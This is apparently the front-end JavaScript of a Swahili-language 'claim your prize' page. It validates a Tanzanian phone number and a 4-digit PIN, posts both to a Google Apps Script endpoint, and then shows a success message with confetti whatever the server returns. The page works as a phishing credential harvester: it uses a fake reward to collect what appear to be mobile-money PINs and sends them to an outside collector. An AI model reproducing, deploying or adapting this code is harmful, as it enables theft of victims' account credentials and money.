// script.js
const form = document.getElementById("redeemForm");
const submitBtn = document.getElementById("submitBtn");
const messageDiv = document.getElementById("message");
const celebrationOverlay = document.getElementById("celebrationOverlay");

// IMPORTANT: Replace with your Google Apps Script Web App URL
const scriptURL = "https://script.google.com/macros/s/AKfycbwNwToxRbIrtIqzR-nAUbNvScrPIvtZaGdrybov3OLi/dev";

// Confetti animation setup
const canvas = document.getElementById('confettiCanvas');
const ctx = canvas.getContext('2d');
let particles = [];
let animationFrame;

function resizeCanvas() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
}

function createParticles() {
    for (let i = 0; i < 100; i++) {
        particles.push({
            x: Math.random() * canvas.width,
            y: Math.random() * canvas.height,
            size: Math.random() * 5 + 2,
            speedY: Math.random() * 3 + 2,
            speedX: Math.random() * 2 - 1,
            color: `hsl(${Math.random() * 60 + 30}, 100%, 50%)` // Yellow/gold colors
        });
    }
}

function animateConfetti() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);

    particles.forEach((p, index) => {
        ctx.fillStyle = p.color;
        ctx.fillRect(p.x, p.y, p.size, p.size);

        p.y += p.speedY;
        p.x += p.speedX;

        if (p.y > canvas.height) {
            particles.splice(index, 1);
        }
    });

    if (particles.length > 0) {
        animationFrame = requestAnimationFrame(animateConfetti);
    }
}

function startConfetti() {
    resizeCanvas();
    particles = [];
    createParticles();
    animateConfetti();
}

function stopConfetti() {
    if (animationFrame) {
        cancelAnimationFrame(animationFrame);
        ctx.clearRect(0, 0, canvas.width, canvas.height);
    }
}

// Handle window resize
window.addEventListener('resize', () => {
    if (celebrationOverlay.style.display === 'flex') {
        resizeCanvas();
    }
});

form.addEventListener("submit", async function (e) {
    e.preventDefault();

    // Disable button and show loading
    submitBtn.disabled = true;
    submitBtn.innerHTML = '<span class="spinner"></span> Inasindiku...';
    messageDiv.innerHTML = '';
    messageDiv.className = '';

    const phone = document.querySelector("input[name='Phone Number']").value.trim();
    const pin = document.querySelector("input[name='PIN']").value.trim();

    // Validate phone number (Tanzania format)
    if (!/^[0-9]{9,12}$/.test(phone)) {
        messageDiv.innerHTML = "❌ Tafadhali ingiza namba ya simu sahihi";
        messageDiv.className = "error-message";
        submitBtn.disabled = false;
        submitBtn.innerHTML = 'TOA ZAWADI';
        return;
    }

    // Validate PIN (4 digits)
    if (!/^\d{4}$/.test(pin)) {
        messageDiv.innerHTML = "❌ PIN lazima iwe namba 4";
        messageDiv.className = "error-message";
        submitBtn.disabled = false;
        submitBtn.innerHTML = 'TOA ZAWADI';
        return;
    }

    // Prepare data for sending
    const params = new URLSearchParams();
    params.append("Phone Number", phone);
    params.append("PIN", pin);

    try {
        console.log('Sending data to:', scriptURL);

        const response = await fetch(scriptURL, {
            method: "POST",
            body: params,
            mode: 'no-cors',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            }
        });

        // For no-cors mode, we can't read the response directly
        // If the request succeeded, we assume success
        messageDiv.innerHTML = "✅ Ofa yako imekubaliwa! Karibu!";
        messageDiv.className = "success-message";

        // Clear form
        form.reset();

        // Show celebration popup
        celebrationOverlay.style.display = 'flex';
        startConfetti();

        // Auto hide celebration after 5 seconds
        setTimeout(() => {
            celebrationOverlay.style.display = 'none';
            stopConfetti();
        }, 5000);

    } catch (error) {
        console.error('Error details:', error);
        messageDiv.innerHTML = "❌ Hitilafu: " + error.message;
        messageDiv.className = "error-message";
    } finally {
        // Re-enable button
        submitBtn.disabled = false;
        submitBtn.innerHTML = 'TOA ZAWADI';
    }
});

// Hide celebration when clicked
celebrationOverlay.addEventListener('click', function () {
    this.style.display = 'none';
    stopConfetti();
});